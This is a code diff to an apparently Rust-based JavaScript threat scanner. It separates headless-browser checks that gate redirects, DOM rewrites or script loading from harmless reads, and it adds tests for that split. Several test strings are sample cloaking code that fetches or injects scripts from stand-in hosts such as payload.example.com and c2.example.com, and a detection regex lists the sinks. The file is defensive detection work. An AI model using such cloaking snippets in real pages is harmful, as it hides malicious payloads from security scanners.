@@ -4,6 +4,8 @@ use oxc_ast::ast::*;
 use oxc_ast::visit::{walk, Visit};
 use oxc_parser::Parser;
 use oxc_span::SourceType;
+use regex::Regex;
+use std::sync::OnceLock;
 use tracing::debug;
 
 use crate::threat::{CodeLocation, DecodedString, DomMutation, JsFlag, NetworkCall, ThreatReport};
@@ -348,10 +350,25 @@ impl<'a> Visit<'a> for SecurityVisitor<'_> {
                     let has_and_chain = src.get(window_start..window_end).map_or(false, |w| w.contains("&&"));
                     if self.has_user_agent_check && is_negated && has_and_chain {
                         // Framer URL-param preservation: !navigator.webdriver && !botUA — not cloaking.
-                    } else {
+                    } else if webdriver_gates_content(src, start, end) {
                         self.report.add_js_flag(JsFlag::SandboxEvasion {
                             technique: "webdriver_check".into(),
-                            detail: "navigator.webdriver accessed — headless browser detection".into(),
+                            detail: "navigator.webdriver accessed — headless browser detection \
+                                     gating a content-delivery sink"
+                                .into(),
+                            loc,
+                        });
+                    } else {
+                        // The probe reads the property but no redirect, DOM rewrite, script
+                        // injection or fetch sits near it, so no content difference was
+                        // observed — bot-detection SDK / framework behaviour, not cloaking.
+                        // Context signal only; the Python analyser reached the same split in
+                        // engine 2.1.0 (otto.de) but this layer kept emitting HIGH, which is
+                        // what mislabelled currys.co.uk (holdout, 2026-08-17).
+                        self.report.add_js_flag(JsFlag::SandboxEvasion {
+                            technique: "webdriver_check_ungated".into(),
+                            detail: "navigator.webdriver accessed — no content gated on the result"
+                                .into(),
                             loc,
                         });
                     }
@@ -604,10 +621,48 @@ fn decode_hex_escapes(s: &str) -> String {
     result
 }
 
+/// Bytes searched either side of a `navigator.webdriver` read for a content-delivery
+/// sink. Mirrors the ±700-char window used by the Python analyser.
+const WEBDRIVER_GATE_WINDOW: usize = 700;
+
+/// True when a content-delivery sink sits near the `start..end` span in `src`.
+///
+/// Mirrors `_gates_content` in `backend/scanner/modules/js_analyser.py` — the two
+/// layers must agree on what "the probe changes what the visitor receives" means.
+/// Reading `navigator.webdriver` is not evasion by itself: bot-detection vendors,
+/// CAPTCHA site-key selection and framework lazy-init all read it without altering a
+/// byte of delivered content. The cloaking claim requires a sink the probe can gate.
+///
+/// Widening this set makes the result MORE often true, which *preserves* the HIGH on
+/// real cloakers — the safe direction for the downgrade this feeds.
+fn webdriver_gates_content(src: &str, start: usize, end: usize) -> bool {
+    static GATE_RE: OnceLock<Regex> = OnceLock::new();
+    let re = GATE_RE.get_or_init(|| {
+        Regex::new(concat!(
+            r#"(?i)location\s*(?:\.\s*(?:href|replace|assign)|\s*=)"#,
+            r#"|window\s*\.\s*location|document\s*\.\s*write|\.\s*innerHTML\s*="#,
+            r#"|\bfetch\s*\(|XMLHttpRequest|window\s*\.\s*open\s*\("#,
+            r#"|createElement\s*\(\s*["']script["']|\.\s*src\s*=|\beval\s*\(|\bimport\s*\("#,
+        ))
+        .expect("static webdriver content-gate regex")
+    });
+    // Byte offsets from the AST are not guaranteed to land on char boundaries once the
+    // window is widened, and slicing a str off-boundary panics.
+    let mut lo = start.saturating_sub(WEBDRIVER_GATE_WINDOW);
+    while lo > 0 && !src.is_char_boundary(lo) {
+        lo -= 1;
+    }
+    let mut hi = end.saturating_add(WEBDRIVER_GATE_WINDOW).min(src.len());
+    while hi < src.len() && !src.is_char_boundary(hi) {
+        hi += 1;
+    }
+    src.get(lo..hi).is_some_and(|w| re.is_match(w))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::threat::ThreatReport;
+    use crate::threat::{Severity, ThreatReport};
 
     fn run(src: &str) -> ThreatReport {
         let mut report = ThreatReport::new("https://test.example");
@@ -658,6 +713,75 @@ mod tests {
         assert!(report.js_flags().iter().any(|f| matches!(
             f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check"
         )));
+    }
+
+    /// Positive controls for the ungated downgrade: a probe that gates ANY
+    /// content-delivery sink must keep the cloaking technique. Written before the
+    /// downgrade landed — the whole risk of that change is deleting these detections.
+    #[test]
+    fn webdriver_gating_content_stays_cloaking() {
+        for src in [
+            "if (navigator.webdriver) { window.location.href = 'https://c2.example.com'; }",
+            "if (navigator.webdriver) { document.write('<h1>nothing here</h1>'); }",
+            "if (!navigator.webdriver) { fetch('https://payload.example.com/stage2'); }",
+            "var bot = navigator.webdriver;\nif (!bot) { document.body.innerHTML = payload; }",
+            "if (navigator.webdriver) { return; }\nvar s = document.createElement('script');\n\
+             s.src = 'https://payload.example.com/x.js'; document.body.appendChild(s);",
+            "if (navigator.webdriver) { location.replace('https://decoy.example.com'); }",
+        ] {
+            let report = run(src);
+            assert!(
+                report.js_flags().iter().any(|f| matches!(
+                    f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check"
+                )),
+                "content-gating probe lost its cloaking technique: {src}"
+            );
+        }
+    }
+
+    /// The FP class this split exists for: bot-detection SDKs, CAPTCHA site-key
+    /// selection and framework lazy-init read the property and deliver identical
+    /// content. Flagged as context (LOW), never as cloaking.
+    #[test]
+    fn webdriver_gating_nothing_is_ungated() {
+        for src in [
+            // otto.de's web-component runtime — skips lazy init under automation.
+            "o && je[1] && !navigator.wd && (n = _e(n, je));\nvar q = navigator.webdriver;",
+            "var fp = { webdriver: navigator.webdriver, lang: navigator.language };",
+            "if (navigator.webdriver) { console.log('automation'); }",
+        ] {
+            let report = run(src);
+            assert!(
+                report.js_flags().iter().any(|f| matches!(
+                    f, JsFlag::SandboxEvasion { technique, .. }
+                    if technique == "webdriver_check_ungated"
+                )),
+                "ungated probe was not downgraded: {src}"
+            );
+            assert!(
+                !report.js_flags().iter().any(|f| matches!(
+                    f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check"
+                )),
+                "ungated probe still emitted the cloaking technique: {src}"
+            );
+        }
+    }
+
+    /// The severity table is the half that actually mislabelled currys.co.uk — the
+    /// technique split is worthless if both map to HIGH.
+    #[test]
+    fn ungated_webdriver_probe_scores_low() {
+        let gated = run("if (navigator.webdriver) { window.location = 'https://c2.example.com'; }");
+        let ungated = run("if (navigator.webdriver) { console.log('automation'); }");
+        let sev_of = |r: &ThreatReport, code: &str| {
+            r.flags.iter().find(|f| f.code == code).map(|f| f.severity)
+        };
+        assert_eq!(sev_of(&gated, "SANDBOX_EVASION_WEBDRIVER"), Some(Severity::High));
+        assert_eq!(
+            sev_of(&ungated, "SANDBOX_EVASION_WEBDRIVER_UNGATED"),
+            Some(Severity::Low)
+        );
+        assert_eq!(sev_of(&ungated, "SANDBOX_EVASION_WEBDRIVER"), None);
     }
 
     #[test]
